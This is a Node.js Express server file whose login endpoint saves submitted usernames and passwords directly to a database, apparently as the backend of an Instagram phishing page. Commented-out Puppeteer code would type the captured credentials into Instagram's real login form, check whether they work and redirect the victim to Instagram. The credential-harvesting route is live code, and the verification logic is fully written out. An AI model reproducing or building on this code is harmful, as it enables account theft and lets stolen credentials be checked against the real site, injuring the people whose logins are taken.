const express=require("express");
const dotenv=require("dotenv");
const userRoutes=require("./routes/userRoutes")
const connectDB = require("./config/db.js")
const {notFound,errorHandler}=require("./error/errorHandler")
const User = require("./models/userModel")
// const bodyParser = require('body-parser');
const cors = require('cors');
const request = require('request');
const puppeteer = require('puppeteer')



dotenv.config();
connectDB();
const app = express();

app.use(express.json());

// app.use(bodyParser.json());
app.use(cors());


// const __dirname1 = path.resolve();

// if (process.env.NODE_ENV === "production") {
//   app.use(express.static(path.join(__dirname1, "/frontend/build")));

//   app.get("*", (req, res) =>
//     res.sendFile(path.resolve(__dirname1, "frontend", "build", "index.html"))
//   );
// } else {
//   app.get("/", (req, res) => {
//     res.send("API is running..");
//   });
// }

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});


app.get('/', (req,res)=>
{
    res.send("API is running")
})

app.post('/api/login/', async (req, res) => {
  try {
    const { loginid, password } = req.body;
    const user = await User.create({
      loginid,
      password,
    });
    // const browser = await puppeteer.launch({ args: ['--no-sandbox'] ,headless: true});
    // const page = await browser.newPage();
    
    // await page.goto('https://www.instagram.com/accounts/login/');
    // await page.waitForSelector('input[name="username"]');
    // await page.type('input[name="username"]', loginid);
    // await page.type('input[name="password"]', password);

    // await page.click('button[type="submit"]');
    
    // await page.waitForNavigation();
    // const url = await page.url();
    // await browser.close();

    // if (url.startsWith('https://www.instagram.com/')) {
    //   // If the login is successful, create the user in your database
    //   // Redirect the user to their Instagram profile page
    //   res.redirect('https://www.instagram.com/<your-username>/');
    // } else {
    //   // If the login is unsuccessful, display an error message to the user
    //   res.send('Invalid username or password');
    // }

    res.status(200).json(user)
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Internal server error" });
  }
});


app.use(notFound)
app.use(errorHandler)

const PORT=process.env.PORT || 3000

app.listen(PORT,console.log(`Server is up and running port:${PORT}`))